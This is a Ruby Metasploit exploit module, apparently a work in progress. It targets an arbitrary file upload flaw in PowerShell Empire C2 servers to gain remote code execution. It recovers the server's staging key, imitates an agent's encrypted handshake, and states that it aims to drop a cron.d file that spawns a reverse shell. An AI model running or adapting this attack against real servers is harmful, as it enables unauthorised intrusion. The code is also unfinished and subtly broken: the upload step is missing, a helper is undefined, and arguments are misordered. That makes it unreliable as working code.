class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
  	include Msf::Exploit::FileDropper

	def initialize(info={})
		super(
			update_info(
				info,
				'Name' => 'PowerShellEmpire Arbitrary file Upload (Millennium Falcon)',

				'Description' => %q{This module exploits a vulnerability in PowerShellEmpire < 5.9.3 
					which allows for RCE via arbitary file uploads. This module will upload a file to the cron.d 
					directory to spawn a reverse shell. Thank you to AceResponder for the discovery of 
					this vunerability and original POC; and of course thank you to h00die for the module suggestion },

					'Author' => [
						'Ace Responder', # Original exploit discovery and POC
						'gardnerapp' # Metasploit module
					], 

					'License' => MSF_LICENSE,
					'References' => [
						'https://aceresponder.com/blog/exploiting-empire-c2-framework',
						'https://github.com/ACE-Responder/Empire-C2-RCE-PoC',
						'https://bc-security.gitbook.io/empire-wiki/quickstart/staging'
					],
					'Payload'         =>
					        {
					          'DisableNops' => true,
					        },
				      'Platform'        => %w{ linux python },
				      'Targets'         =>
				        [
				          [ 'Python', { 'Arch' => ARCH_PYTHON, 'Platform' => 'python' } ],
				          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],
				          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ]
				        ],
				))

			register_options(
				[
					Opt::RPORT(80),
					OptString.new("TARGETURI", [ 
						false, 
						'Base URI path',
						 '/']),
					OptString.new("STAGE0_URI", [
						 true, 
						'Resource request by initial launcher, default is /download/python', 
						'/download/python']),
					OptString.new("STAGE1_URI", [
						 true, 
						'Endpoint for stager to communicate back to Empire. Default value is \'/admin/get.php\'. Other default values for Empire stagers are: \'/news.php\' and \'/login/process.php\'', 
						'/admin/get.php']), 
				])
	end 

	def check
    	return Exploit::CheckCode::Safe if get_staging_key.nil?

    	Exploit::CheckCode::Appears
  	end

  	def rsa_encode_int(value)
	    encoded = []
	    while value > 0 do
	      encoded << (value & 0xff)
	      value >>= 8
	    end
  	end

  	def rsa_key_to_xml(rsa_key)
	    rsa_key_xml  = "<RSAKeyValue>\n"
	    rsa_key_xml << "  <Exponent>#{ rsa_encode_int(rsa_key.e.to_i) }</Exponent>\n"
	    rsa_key_xml << "  <Modulus>#{ rsa_encode_int(rsa_key.n.to_i) }</Modulus>\n"
	    rsa_key_xml << "</RSAKeyValue>"

	    rsa_key_xml
 	end

  	def aes_encrypt(key,data)
	  	cipher = OpenSSL::Cipher.new('aes-256-cbc')
	    cipher.encrypt
	    iv = cipher.random_iv
	    cipher.key = key
	    cipher.iv = iv

	    data = iv + cipher.update(data) + cipher.final


	    digest = OpenSSL::Digest.new('sha1')
	    data << OpenSSL::HMAC.digest(digest, key, data)
	    data
  	end 

  	def rc4encrypt(key,data)
			# Generate a blank array s where s[i] = i from 0..256
			s = []
			(0..256).each {|i| s[i] = i }

			j = 0
			out = []

			# Turn key into array of bytes
			key = key.bytes

			(0..256).each do |i|
				j = (j + s[i] + key[i % key.length]) % 256
				s[i], s[j] = s[j], s[i]
			end 

			i = j = 0

			data.each_char do |char|
				i = (i + 1) % 256
				j = (j + s[i]) % 256
				s[i], s[j] = s[j], s[i]

				# .ord converts to unicode representation
				# 'a'.ord = 97
				# TODO encode to latin-1 
				out << (char.ord ^ s[(s[i] + s[j]) % 256])
			end 
			out.pack("V*") #TODO 07/12/24 double check packing
		end

  	# encrypts data for stage 1 and on
  	def build_routing_packet(meta=0, enc_data='',additional=0)
  		# pack data
  		pack = [2, meta, additional, enc_data.length].pack(">CCSL").encode! 'ASCII-8BIT'

  		# PYTHON https://docs.python.org/3/library/struct.html
  		# =BBHL
  		# = Native on Linux little endian, need to dynamically find endianess of the machine
  		# B unsigned char
  		# H Unsigned Short 
  		# L Unsigned Long

  		# RUBY From https://docs.ruby-lang.org/en/master/packed_data_rdoc.html
  		#
  		# > == big endian < == lil endian 
  		# C = 8 bit unisgned char 
  		# S = Unsigned 16 bit integer
  		# L = Unsigned long 32 bit integer
  		#data = session_id + pack 
  		data = @session_id + pack

  		# This truncates with a 0 before note sure why but it doesn't look the same as 
  		# the python os.urandom(4)
  		iv = '\xa4\x89P'
  		
  		# Turn the key into bytes
  		key = iv + staging_key
  		# todo too many params, going to be using staging key more either make instance var
  		# or find a way to re-use it throughout functions so that it doesn't need ot be passed
  		#key_bytes = key.scan(/../).map { |x| x.hex.chr }.join

    	#rc4.key_len= key_bytes.length
  		#rc4.key= key_bytes
  		# encrypt
  		#d = rc4.update(data) + rc4.final 

  		d = rc4encrypt(key,data)
  		
  		#final packet
  		packet = iv + d + enc_data
  	end 

  	# decrypts response
  	def aes_decrypt(sk, body)
  		iv = body[0..16]
  		cipher = OpenSSL::Cipher.new("aes-256-cbc")
  		cipher.decrypt
  		cipher.key= sk
  		cipher.iv= iv

  		decoded = cipher.update(body) + cipher.final
  	end 

  	# Send Agent public key and session ID
  	def stage1()

  		data = aes_encrypt(staging_key, rsa_key_to_xml(public_key))

  		packet = build_routing_packet(data, 2, staging_key, @session_id)

  		# encrypt pub key as data with staging key as aes k
  		res = send_request_cgi!({
  			#'cookie'    => "session=#{session_id}",
  			'data' => packet,
  			'method' => 'POST',
  			'uri' => normalize_uri(target_uri.path, datastore['STAGE1_URI']), 
  			#'headers' => {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'}, 
  		})

  		fail_with(Failure::Unknown, 'Failed to send the RSA key') unless res and res.code == 200
    	print_good("Successfully sent the RSA key")

    	packet = aes_decrypt(staging_key, res.body)
    	nonce = packet[0..16]
    	server_pub = packet[16..]
  	end

  	# Recovers the staging key, spoofs step0 of stager process
	# Staging URI is subject to change
	def stage0
		res = send_request_cgi!({
			'method' => 'GET',
			'uri' => normalize_uri(target_uri.path, datastore['STAGE0_URI'])
		})

		return unless res && res.code == 200
		
		staging_key = res.body.match(/key=IV\+\'(.*)\'\.encode/).to_s.delete_prefix!("key=IV+'").delete_suffix!("'.encode")
		staging_key
	end 

	def exploit
		#todo get these to print
		print_status("Attempting to recover staging key....")
		# grab the staging key from the server and start spoofing as a stager
		@staging_key = stage0

		fail_with(Failure::Unknown, 'Failed to recover staging key.') if staging_key.nil?

		print_good("Recovered staging key -> \"#{staging_key}\" !")

		rsa = OpenSSL::PKey::RSA.new 2048
		@pub_key = rsa.pub_key.to_s
		@priv_key = rsa.to_s
		# ^^ not what I need figure out diffie
		#session_id = SecureRandom.alphanumeric(8).encode('UTF-8').upcase
		@session_id = 'ABCD123'.encode 'ASCII-8BIT'
		
		stage1()
	end 
end 